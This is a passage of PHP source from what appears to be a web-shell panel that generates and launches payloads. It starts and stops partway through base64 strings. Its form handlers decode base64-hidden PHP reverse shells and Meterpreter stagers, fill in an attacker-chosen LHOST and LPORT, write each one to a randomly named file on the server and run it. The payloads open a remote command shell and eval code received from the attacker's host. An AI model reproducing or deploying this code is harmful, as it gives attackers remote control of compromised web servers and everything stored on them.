KCRoYW5kbGUpOwogICAgICB9ZWxzZQogICAgICBpZigkd0hhY0MoJ3NoZWxsX2V4ZWMnKWFuZCEkWVpQY2MoJ3NoZWxsX2V4ZWMnLCRSaXFYclRiKSl7CiAgICAgICAgJG89c2hlbGxfZXhlYygkYyk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCR3SGFjQygnZXhlYycpYW5kISRZWlBjYygnZXhlYycsJFJpcVhyVGIpKXsKICAgICAgICAkbz1hcnJheSgpOwogICAgICAgIGV4ZWMoJGMsJG8pOwogICAgICAgICRvPWpvaW4oY2hyKDEwKSwkbykuY2hyKDEwKTsKICAgICAgfWVsc2UKICAgICAgewogICAgICAgICRvPTA7CiAgICAgIH0KICAgIAogICAgICB9CiAgICAgIEBzb2NrZXRfd3JpdGUoJG1zZ3NvY2ssJG8sc3RybGVuKCRvKSk7CiAgICB9CiAgICBAc29ja2V0X2Nsb3NlKCRtc2dzb2NrKTsK");
    $file = str_replace('xloncatport', $port, $file);
    $filename = PREFIX.mt_rand(1,1000).SUFFIX;
    if(file_put_contents($filename, $file)) {
        echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
    }
  }
  ?><form method="POST"><?php
  fv_inputtext("RPORT:", "bp1_rport", "Type RPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
 }
 
  if($payload == "php/meterpreter/reverse_tcp") {
    if(@checkvar($_POST['r_lport']) === TRUE) {
        $port = $_POST['r_lport'];
        $host = $_POST['r_lhost'];
        $file = d("Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJ3hsb25jYXRpcCc7ICRwb3J0ID0geGxvbmNhdHBvcnQ7IGlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gZWxzZWlmICgoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBlbHNlaWYgKCgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBlbHNlIHsgZGllKCdubyBzb2NrZXQgZnVuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgZXZhbCgkYik7IGRpZSgpOwo=");
        $file = str_replace('xloncatip', $host, $file);
        $file = str_replace('xloncatport', $port, $file);
        $filename = PREFIX.mt_rand(1,1000).SUFFIX;
        if(file_put_contents($filename, $file)) {
            echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
        }
    }
  ?><form method="POST"><?php
  fv_inputtext("LHOST:", "r_lhost", "Type LHOST");
  fv_inputtext("LPORT:", "r_lport", "Type LPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
  }
  if($payload == "php/reverse_php") {
    if(@checkvar($_POST['r_lport']) === TRUE) {
        $port = $_POST['r_lport'];
        $host = $_POST['r_lhost'];
        $file = d("ICAgIC8qPD9waHAgLyoqLwogICAgICBAZXJyb3JfcmVwb3J0aW5nKDApOwogICAgICBAc2V0X3RpbWVfbGltaXQoMCk7IEBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7CiAgICAgICRkaXM9QGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CiAgICAgIGlmKCFlbXB0eSgkZGlzKSl7CiAgICAgICAgJGRpcz1wcmVnX3JlcGxhY2UoJy9bLCBdKy8nLCAnLCcsICRkaXMpOwogICAgICAgICRkaXM9ZXhwbG9kZSgnLCcsICRkaXMpOwogICAgICAgICRkaXM9YXJyYXlfbWFwKCd0cmltJywgJGRpcyk7CiAgICAgIH1lbHNlewogICAgICAgICRkaXM9YXJyYXkoKTsKICAgICAgfQogICAgICAKICAgICRpcGFkZHI9J3hsb25jYXRpcCc7CiAgICAkcG9ydD14bG9uY2F0cG9ydDsKCiAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdXVml4VkZFdmpYY1lwJykpewogICAgICBmdW5jdGlvbiBXVml4VkZFdmpYY1lwKCRjKXsKICAgICAgICBnbG9iYWwgJGRpczsKICAgICAgICAKICAgICAgaWYgKEZBTFNFICE9PSBzdHJwb3Moc3RydG9sb3dlcihQSFBfT1MpLCAnd2luJyApKSB7CiAgICAgICAgJGM9JGMuIiAyPiYxXG4iOwogICAgICB9CiAgICAgICRsdnNHPSdpc19jYWxsYWJsZSc7CiAgICAgICRrUmRNbT0naW5fYXJyYXknOwogICAgICAKICAgICAgaWYoJGx2c0coJ3BvcGVuJylhbmQhJGtSZE1tKCdwb3BlbicsJGRpcykpewogICAgICAgICRmcD1wb3BlbigkYywncicpOwogICAgICAgICRvPU5VTEw7CiAgICAgICAgaWYoaXNfcmVzb3VyY2UoJGZwKSl7CiAgICAgICAgICB3aGlsZSghZmVvZigkZnApKXsKICAgICAgICAgICAgJG8uPWZyZWFkKCRmcCwxMDI0KTsKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgQHBjbG9zZSgkZnApOwogICAgICB9ZWxzZQogICAgICBpZigkbHZzRygnc3lzdGVtJylhbmQhJGtSZE1tKCdzeXN0ZW0nLCRkaXMpKXsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHN5c3RlbSgkYyk7CiAgICAgICAgJG89b2JfZ2V0X2NvbnRlbnRzKCk7CiAgICAgICAgb2JfZW5kX2NsZWFuKCk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCRsdnNHKCdleGVjJylhbmQhJGtSZE1tKCdleGVjJywkZGlzKSl7CiAgICAgICAgJG89YXJyYXkoKTsKICAgICAgICBleGVjKCRjLCRvKTsKICAgICAgICAkbz1qb2luKGNocigxMCksJG8pLmNocigxMCk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCRsdnNHKCdwcm9jX29wZW4nKWFuZCEka1JkTW0oJ3Byb2Nfb3BlbicsJGRpcykpewogICAgICAgICRoYW5kbGU9cHJvY19vcGVuKCRjLGFycmF5KGFycmF5KHBpcGUsJ3InKSxhcnJheShwaXBlLCd3JyksYXJyYXkocGlwZSwndycpKSwkcGlwZXMpOwogICAgICAgICRvPU5VTEw7CiAgICAgICAgd2hpbGUoIWZlb2YoJHBpcGVzWzFdKSl7CiAgICAgICAgICAkby49ZnJlYWQoJHBpcGVzWzFdLDEwMjQpOwogICAgICAgIH0KICAgICAgICBAcHJvY19jbG9zZSgkaGFuZGxlKTsKICAgICAgfWVsc2UKICAgICAgaWYoJGx2c0coJ3NoZWxsX2V4ZWMnKWFuZCEka1JkTW0oJ3NoZWxsX2V4ZWMnLCRkaXMpKXsKICAgICAgICAkbz1zaGVsbF9leGVjKCRjKTsKICAgICAgfWVsc2UKICAgICAgaWYoJGx2c0coJ3Bhc3N0aHJ1JylhbmQhJGtSZE1tKCdwYXNzdGhydScsJGRpcykpewogICAgICAgIG9iX3N0YXJ0KCk7CiAgICAgICAgcGFzc3RocnUoJGMpOwogICAgICAgICRvPW9iX2dldF9jb250ZW50cygpOwogICAgICAgIG9iX2VuZF9jbGVhbigpOwogICAgICB9ZWxzZQogICAgICB7CiAgICAgICAgJG89MDsKICAgICAgfQogICAgCiAgICAgICAgcmV0dXJuICRvOwogICAgICB9CiAgICB9CiAgICAkbm9mdW5jcz0nbm8gZXhlYyBmdW5jdGlvbnMnOwogICAgaWYoaXNfY2FsbGFibGUoJ2Zzb2Nrb3BlbicpYW5kIWluX2FycmF5KCdmc29ja29wZW4nLCRkaXMpKXsKICAgICAgJHM9QGZzb2Nrb3BlbigidGNwOi8vMC4wLjAuMCIsJHBvcnQpOwogICAgICB3aGlsZSgkYz1mcmVhZCgkcywyMDQ4KSl7CiAgICAgICAgJG91dCA9ICcnOwogICAgICAgIGlmKHN1YnN0cigkYywwLDMpID09ICdjZCAnKXsKICAgICAgICAgIGNoZGlyKHN1YnN0cigkYywzLC0xKSk7CiAgICAgICAgfSBlbHNlIGlmIChzdWJzdHIoJGMsMCw0KSA9PSAncXVpdCcgfHwgc3Vic3RyKCRjLDAsNCkgPT0gJ2V4aXQnKSB7CiAgICAgICAgICBicmVhazsKICAgICAgICB9ZWxzZXsKICAgICAgICAgICRvdXQ9V1ZpeFZGRXZqWGNZcChzdWJzdHIoJGMsMCwtMSkpOwogICAgICAgICAgaWYoJG91dD09PWZhbHNlKXsKICAgICAgICAgICAgZndyaXRlKCRzLCRub2Z1bmNzKTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZ3cml0ZSgkcywkb3V0KTsKICAgICAgfQogICAgICBmY2xvc2UoJHMpOwogICAgfWVsc2V7CiAgICAgICRzPUBzb2NrZXRfY3JlYXRlKEFGX0lORVQsU09DS19TVFJFQU0sU09MX1RDUCk7CiAgICAgIEBzb2NrZXRfY29ubmVjdCgkcywkaXBhZGRyLCRwb3J0KTsKICAgICAgQHNvY2tldF93cml0ZSgkcywic29ja2V0X2NyZWF0ZSIpOwogICAgICB3aGlsZSgkYz1Ac29ja2V0X3JlYWQoJHMsMjA0OCkpewogICAgICAgICRvdXQgPSAnJzsKICAgICAgICBpZihzdWJzdHIoJGMsMCwzKSA9PSAnY2QgJyl7CiAgICAgICAgICBjaGRpcihzdWJzdHIoJGMsMywtMSkpOwogICAgICAgIH0gZWxzZSBpZiAoc3Vic3RyKCRjLDAsNCkgPT0gJ3F1aXQnIHx8IHN1YnN0cigkYywwLDQpID09ICdleGl0JykgewogICAgICAgICAgYnJlYWs7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAkb3V0PVdWaXhWRkV2alhjWXAoc3Vic3RyKCRjLDAsLTEpKTsKICAgICAgICAgIGlmKCRvdXQ9PT1mYWxzZSl7CiAgICAgICAgICAgIEBzb2NrZXRfd3JpdGUoJHMsJG5vZnVuY3MpOwogICAgICAgICAgICBicmVhazsKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgQHNvY2tldF93cml0ZSgkcywkb3V0LHN0cmxlbigkb3V0KSk7CiAgICAgIH0KICAgICAgQHNvY2tldF9jbG9zZSgkcyk7CiAgICB9Cg==");
        $file = str_replace('xloncatip', $host, $file);
        $file = str_replace('xloncatport', $port, $file);
        $filename = PREFIX.mt_rand(1,1000).SUFFIX;
        if(file_put_contents($filename, $file)) {
            echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
        }
    }
  ?><form method="POST"><?php
  fv_inputtext("LHOST:", "r_lhost", "Type LHOST");
  fv_inputtext("LPORT:", "r_lport", "Type LPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
  }
  if($payload == "php/meterpreter/reverse_tcp_uuid") {
    if(@checkvar($_POST['r_lport']) === TRUE) {
        $port = $_POST['r_lport'];
        $host = $_POST['r_lhost'];
        $file = d("Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJ3hsb25jYXRpcCc7ICRwb3J0ID0geGxvbmNhdHBvcnQ7IGlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gZWxzZWlmICgoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBlbHNlaWYgKCgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBlbHNlIHsgZGllKCdubyBzb2NrZXQgZnVuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gJHU9Ilx4YmRceDhiXHgwYVx4NWRceDkyXHg1MVx4ZWFceGY2XHhlNFx4NDFceGY3XHg0ZVx4YmRceGE0XHg3Ylx4ZGMiOyBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogZndyaXRlKCRzLCAkdSk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiBzb2NrZXRfd3JpdGUoJHMsICR1KTsgYnJlYWs7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgZXZhbCgkYik7IGRpZSgpOwo=");
        $file = str_replace('xloncatip', $host, $file);
        $file = str_replace('xloncatport', $port, $file);
        $filename = PREFIX.mt_rand(1,1000).SUFFIX;
        if(file_put_contents($filename, $file)) {
            echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
        }
    }
  ?><form method="POST"><?php
  fv_inputtext("LHOST:", "r_lhost", "Type LHOST");
  fv_inputtext("LPORT:", "r_lport", "Type LPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
  }
  if($payload == "php/meterpreter_reverse_tcp") {
    if(@checkvar($_POST['r_lport']) === TRUE) {
        $port = $_POST['r_lport'];
        $host = $_POST['r_lhost'];
        $file = d("Lyo8P3BocCAvKiovIGlmICghaXNzZXQoJEdMT0JBTFNbJ2NoYW5uZWxzJ10pKSB7ICRHTE9CQUxTWydjaGFubmVscyddID0gYXJyYXkoKTsgfSBpZiAoIWlzc2V0KCRHTE9CQUxTWydjaGFubmVsX3Byb2Nlc3NfbWFwJ10pKSB7ICRHTE9CQUxTWydjaGFubmVsX3Byb2Nlc3NfbWFwJ10gPSBhcnJheSgpOyB9IGlmICghaXNzZXQoJEdMT0JBTFNbJ3Jlc291cmNlX3R5cGVfbWFwJ10pKSB7ICRHTE9CQUxTWydyZXNvdXJjZV90eXBlX21hcCddID0gYXJyYXkoKTsgfSBpZiAoIWlzc2V0KCRHTE9CQUxTWyd1ZHBfaG9zdF9tYXAnXSkpIHsgJEdMT0JBTFNbJ3VkcF9ob3N0X21hcCddID0gYXJyYXkoKTsgfSBpZiAoIWlzc2V0KCRHTE9CQUxTWydyZWFkZXJzJ10pKSB7ICRHTE9CQUxTWydyZWFkZXJzJ10gPSBhcnJheSgpOyB9IGlmICghaXNzZXQoJEdMT0JBTFNbJ2NvbW1hbmRzJ10pKSB7ICRHTE9CQUxTWydjb21tYW5kcyddID0gYXJyYXkoImNvcmVfbG9hZGxpYiIsICJjb3JlX21hY2hpbmVfaWQiLCAiY29yZV9zZXRfdXVpZCIpOyB9IGZ1bmN0aW9uIHJlZ2lzdGVyX2NvbW1hbmQoJGMpIHsgZ2xvYmFsICRjb21tYW5kczsgaWYgKCEgaW5fYXJyYXkoJGMsICRjb21tYW5kcykpIHsgYXJyYXlfcHVzaCgkY29tbWFuZHMsICRjKTsgfSB9IGZ1bmN0aW9uIG15X3ByaW50KCRzdHIpIHsgfSBteV9wcmludCgiRXZhbGluZyBtYWluIG1ldGVycHJldGVyIHN0YWdlIik7IGZ1bmN0aW9uIGR1bXBfYXJyYXkoJGFyciwgJG5hbWU9bnVsbCkgeyBpZiAoaXNfbnVsbCgkbmFtZSkpIHsgJG5hbWUgPSAiQXJyYXkiOyB9IG15X3ByaW50KHNwcmludGYoIiRuYW1lICglcykiLCBjb3VudCgkYXJyKSkpOyBmb3JlYWNoICgkYXJyIGFzICRrZXkgPT4gJHZhbCkgeyBpZiAoaXNfYXJyYXkoJHZhbCkpIHsgZHVtcF9hcnJheSgkdmFsLCAieyRuYW1lfVt7JGtleX1dIik7IH0gZWxzZSB7IG15X3ByaW50KHNwcmludGYoIiAka2V5ICgkdmFsKSIpKTsgfSB9IH0gZnVuY3Rpb24gZHVtcF9yZWFkZXJzKCkgeyBnbG9iYWwgJHJlYWRlcnM7IGR1bXBfYXJyYXkoJHJlYWRlcnMsICdSZWFkZXJzJyk7IH0gZnVuY3Rpb24gZHVtcF9yZXNvdXJjZV9tYXAoKSB7IGdsb2JhbCAkcmVzb3VyY2VfdHlwZV9tYXA7IGR1bXBfYXJyYXkoJHJlc291cmNlX3R5cGVfbWFwLCAnUmVzb3VyY2UgbWFwJyk7IH0gZnVuY3Rpb24gZHVtcF9jaGFubmVscygkZXh0cmE9IiIpIHsgZ2xvYmFsICRjaGFubmVsczsgZHVtcF9hcnJheSgkY2hhbm5lbHMsICdDaGFubmVscyAnLiRleHRyYSk7IH0gaWYgKCFmdW5jdGlvbl9leGlzdHMoImZpbGVfZ2V0X2NvbnRlbnRzIikpIHsgZnVuY3Rpb24gZmlsZV9nZXRfY29udGVudHMoJGZpbGUpIHsgJGYgPSBAZm9wZW4oJGZpbGUsInJiIik7ICRjb250ZW50cyA9IGZhbHNlOyBpZiAoJGYpIHsgZG8geyAkY29udGVudHMgLj0gZmdldHMoJGYpOyB9IHdoaWxlICghZmVvZigkZikpOyB9IGZjbG9zZSgkZik7IHJldHVybiAkY29udGVudHM7IH0gfSBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnc29ja2V0X3NldF9vcHRpb24nKSkgeyBmdW5jdGlvbiBzb2NrZXRfc2V0X29wdGlvbigkc29jaywgJHR5cGUsICRvcHQsICR2YWx1ZSkgeyBzb2NrZXRfc2V0b3B0KCRzb2NrLCAkdHlwZSwgJG9wdCwgJHZhbHVlKTsgfSB9IGRlZmluZSgiUEFZTE9BRF9VVUlEIiwgIlx4M2RceDNiXHhhOFx4MTJceDUyXHgwYVx4MTJceDFiXHg5OFx4NmJceDhiXHg2NFx4YzFceDhlXHgwNVx4ZTYiKTsgZGVmaW5lKCJQQUNLRVRfVFlQRV9SRVFVRVNUIiwgMCk7IGRlZmluZSgiUEFDS0VUX1RZUEVfUkVTUE9OU0UiLCAxKTsgZGVmaW5lKCJQQUNLRVRfVFlQRV9QTEFJTl9SRVFVRVNUIiwgMTApOyBkZWZpbmUoIlBBQ0tFVF9UWVBFX1BMQUlOX1JFU1BPTlNFIiwgMTEpOyBkZWZpbmUoIkVSUk9SX1NVQ0NFU1MiLCAwKTsgZGVmaW5lKCJFUlJPUl9GQUlMVVJFIiwgMSk7IGRlZmluZSgiQ0hBTk5FTF9DTEFTU19CVUZGRVJFRCIsIDApOyBkZWZpbmUoIkNIQU5ORUxfQ0xBU1NfU1RSRUFNIiwgMSk7IGRlZmluZSgiQ0hBTk5FTF9DTEFTU19EQVRBR1JBTSIsIDIpOyBkZWZpbmUoIkNIQU5ORUxfQ0xBU1NfUE9PTCIsIDMpOyBkZWZpbmUoIlRMVl9NRVRBX1RZUEVfTk9ORSIsICggMCApKTsgZGVmaW5lKCJUTFZfTUVUQV9UWVBFX1NUUklORyIsICgxIDw8IDE2KSk7IGRlZmluZSgiVExWX01FVEFfVFlQRV9VSU5UIiwgKDEgPDwgMTcpKTsgZGVmaW5lKCJUTFZfTUVUQV9UWVBFX1JBVyIsICgxIDw8IDE4KSk7IGRlZmluZSgiVExWX01FVEFfVFlQRV9CT09MIiwgKDEgPDwgMTkpKTsgZGVmaW5lKCJUTFZfTUVUQV9UWVBFX1FXT1JEIiwgKDEgPDwgMjApKTsgZGVmaW5lKCJUTFZfTUVUQV9UWVBFX0NPTVBSRVNTRUQiLCAoMSA8PCAyOSkpOyBkZWZpbmUoIlRMVl9NRVRBX1RZUEVfR1JPVVAiLCAoMSA8PCAzMCkpOyBkZWZpbmUoIlRMVl9NRVRBX1RZUEVfQ09NUExFWCIsICgxIDw8IDMxKSk7IGRlZmluZSgiVExWX01FVEFfVFlQRV9NQVNLIiwgKDE8PDMxKSsoMTw8MzApKygxPDwyOSkrKDE8PDE5KSsoMTw8MTgpKygxPDwxNykrKDE8PDE2KSk7IGRlZmluZSgiVExWX1JFU0VSVkVEIiwgMCk7IGRlZmluZSgiVExWX0VYVEVOU0lPTlMiLCAyMDAwMCk7IGRlZmluZSgiVExWX1VTRVIiLCA0MDAwMCk7IGRlZmluZSgiVExWX1RFTVAiLCA2MDAwMCk7IGRlZmluZSgiVExWX1RZUEVfQU5ZIiwgVExWX01FVEFfVFlQRV9OT05FIHwgMCk7IGRlZmluZSgiVExWX1RZUEVfTUVUSE9EIiwgVExWX01FVEFfVFlQRV9TVFJJTkcgfCAxKTsgZGVmaW5lKCJUTFZfVFlQRV9SRVFVRVNUX0lEIiwgVExWX01FVEFfVFlQRV9TVFJJTkcgfCAyKTsgZGVmaW5lKCJUTFZfVFlQRV9FWENFUFRJT04iLCBUTFZfTUVUQV9UWVBFX0dST1VQIHwgMyk7IGRlZmluZSgiVExWX1RZUEVfUkVTVUxUIiwgVExWX01FVEFfVFlQRV9VSU5UIHwgNCk7IGRlZmluZSgiVExWX1RZUEVfU1RSSU5HIiwgVExWX01FVEFfVFlQRV9TVFJJTkcgfCAxMCk7IGRlZmluZSgiVExWX1RZUEVfVUlOVCIsIFRMVl9NRVRBX1RZUEVfVUlOVCB8IDExKTsgZGVmaW5lKCJUTFZfVFlQRV9CT09MIiwgVExWX01FVEFfVFlQRV9CT09MIHwgMTIpOyBkZWZpbmUoIlRMVl9UWVBFX0xFTkdUSCIsIFRMVl9NRVRBX1RZUEVfVUlOVCB8IDI1KTsgZGVmaW5lKCJUTFZfVFlQRV9EQVRBIiwgVExWX01FVEFfVFlQRV9SQVcgfCAyNik7IGRlZmluZSgiVExWX1RZUEVfRkxBR1MiLCBUTFZfTUVUQV9UWVBFX1VJTlQgfCAyNyk7IGRlZmluZSgiVExWX1RZUEVfQ0hBTk5FTF9JRCIsIFRMVl9NRVRBX1RZUEVfVUlOVCB8IDUwKTsgZGVmaW5lKCJUTFZfVFlQRV9DSEFOTkVMX1RZUEUiLCBUTFZfTUVUQV9UWVBFX1NUUklORyB8IDUxKTsgZGVmaW5lKCJUTFZfVFlQRV9DSEFOTkVMX0RBVEEiLCBUTFZfTUVUQV9UWVBFX1JBVyB8IDUyKTsgZGVmaW5lKCJUTFZfVFlQRV9DSEFOTkVMX0RBVEFfR1JPVVAiLCBUTFZfTUVUQV9UWVBFX0dST1VQIHwgNTMpOyBkZWZpbmUoIlRMVl9UWVBFX0NIQU5ORUxfQ0xBU1MiLCBUTFZfTUVUQV9UWVBFX1VJTlQgfCA1NCk7IGRlZmluZSgiVExWX1RZUEVfU0VFS19XSEVOQ0UiLCBUTFZfTUVUQV9UWVBFX1VJTlQgfCA3MCk7IGRlZmluZSgiVExWX1RZUEVfU0VFS19PRkZTRVQiLCBUTFZfTUVUQV9UWVBFX1VJTlQgfCA3MSk7IGRlZmluZSgiVExWX1RZUEVfU0VFS19QT1MiLCBUTFZfTUVUQV9UWVBFX1VJTlQgfCA3Mik7IGRlZmluZSgiVExWX1RZUEVfRVhDRVBUSU9OX0NPREUiLCBUTFZfTUVUQV9UWVBFX1VJTlQgfCAzMDApOyBkZWZpbmUoIlRMVl9UWVBFX0VYQ0VQVElPTl9TVFJJTkciLCBUTFZfTUVUQV9UWVBFX1NUUklORyB8IDMwMSk7IGRlZmluZSgiVExWX1RZUEVfTElCUkFSWV9QQVRIIiwgVExWX01FVEFfVFlQRV9TVFJJTkcgfCA0MDApOyBkZWZpbmUoIlRMVl9UWVBFX1RBUkdFVF9QQVRIIiwgVExWX01FVEFfVFlQRV9TVFJJTkcgfCA0MDEpOyBkZWZpbmUoIlRMVl9UWVBFX01BQ0hJTkVfSUQiLCBUTFZfTUVUQV9UWVBFX1NUUklORyB8IDQ2MCk7IGRlZmluZSgiVExWX1RZUEVfVVVJRCIsIFRMVl9NRVRBX1RZUEVfUkFXIHwgNDYxKTsgZGVmaW5lKCJUTFZfVFlQRV9DSVBIRVJfTkFNRSIsIFRMVl9NRVRBX1RZUEVfU1RSSU5HIHwgNTAwKTsgZGVmaW5lKCJUTFZfVFlQRV9DSVBIRVJfUEFSQU1FVEVSUyIsIFRMVl9NRVRBX1RZUEVfR1JPVVAgfCA1MDEpOyBmdW5jdGlvbiBteV9jbWQoJGNtZCkgeyByZXR1cm4gc2hlbGxfZXhlYygkY21kKTsgfSBmdW5jdGlvbiBpc193aW5kb3dzKCkgeyByZXR1cm4gKHN0cnRvdXBwZXIoc3Vic3RyKFBIUF9PUywwLDMpKSA9PSAiV0lOIik7IH0gZnVuY3Rpb24gY29yZV9jaGFubmVsX29wZW4oJHJlcSwgJiRwa3QpIHsgJHR5cGVfdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfQ0hBTk5FTF9UWVBFKTsgbXlfcHJpbnQoIkNsaWVudCB3YW50cyBhICIuICR0eXBlX3RsdlsndmFsdWUnXSAuIiBjaGFubmVsLCBpJ2xsIHNlZSB3aGF0IGkgY2FuIGRvIik7ICRoYW5kbGVyID0gImNoYW5uZWxfY3JlYXRlXyIuICR0eXBlX3RsdlsndmFsdWUnXTsgaWYgKCR0eXBlX3RsdlsndmFsdWUnXSAmJiBpc19jYWxsYWJsZSgkaGFuZGxlcikpIHsgbXlfcHJpbnQoIkNhbGxpbmcgeyRoYW5kbGVyfSIpOyAkcmV0ID0gJGhhbmRsZXIoJHJlcSwgJHBrdCk7IH0gZWxzZSB7IG15X3ByaW50KCJJIGRvbid0IGtub3cgaG93IHRvIG1ha2UgYSAiLiAkdHlwZV90bHZbJ3ZhbHVlJ10gLiIgY2hhbm5lbC4gPSgiKTsgJHJldCA9IEVSUk9SX0ZBSUxVUkU7IH0gcmV0dXJuICRyZXQ7IH0gZnVuY3Rpb24gY29yZV9jaGFubmVsX2VvZigkcmVxLCAmJHBrdCkgeyBteV9wcmludCgiZG9pbmcgY2hhbm5lbCBlb2YiKTsgJGNoYW5fdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfQ0hBTk5FTF9JRCk7ICRjID0gZ2V0X2NoYW5uZWxfYnlfaWQoJGNoYW5fdGx2Wyd2YWx1ZSddKTsgaWYgKCRjKSB7IGlmIChlb2YoJGNbMV0pKSB7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfQk9PTCwgMSkpOyB9IGVsc2UgeyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX0JPT0wsIDApKTsgfSByZXR1cm4gRVJST1JfU1VDQ0VTUzsgfSBlbHNlIHsgcmV0dXJuIEVSUk9SX0ZBSUxVUkU7IH0gfSBmdW5jdGlvbiBjb3JlX2NoYW5uZWxfcmVhZCgkcmVxLCAmJHBrdCkgeyBteV9wcmludCgiZG9pbmcgY2hhbm5lbCByZWFkIik7ICRjaGFuX3RsdiA9IHBhY2tldF9nZXRfdGx2KCRyZXEsIFRMVl9UWVBFX0NIQU5ORUxfSUQpOyAkbGVuX3RsdiA9IHBhY2tldF9nZXRfdGx2KCRyZXEsIFRMVl9UWVBFX0xFT